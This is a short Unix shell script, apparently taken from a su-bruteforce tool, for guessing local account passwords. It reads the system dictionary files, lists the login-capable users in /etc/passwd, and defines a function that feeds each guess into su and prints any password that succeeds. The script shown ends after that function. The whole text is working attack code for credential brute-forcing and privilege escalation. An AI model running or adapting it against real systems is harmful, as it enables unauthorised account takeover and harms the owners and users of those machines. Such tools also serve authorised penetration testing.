#!/bin/sh
#https://github.com/carlospolop/su-bruteforce/blob/master/suBF.sh
words="$(cat {/usr/share/dict/*,/usr/dict/*} 2>/dev/null)"

users="$(awk -F: '$NF !~ /(nologin|false)/{print $1}' /etc/passwd)"

USER=""
TIMEOUTPROC="0.7"
SLEEPPROC="0.007"

do_su (){
  USER=$1
  PASSWORDTRY=$2
  trysu="$(echo "$PASSWORDTRY" | timeout "${TIMEOUTPROC}" su "${USER}" -c whoami 2>/dev/null)" 
  if [ "$trysu" ]; then
    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
    exit 0;
  fi
}

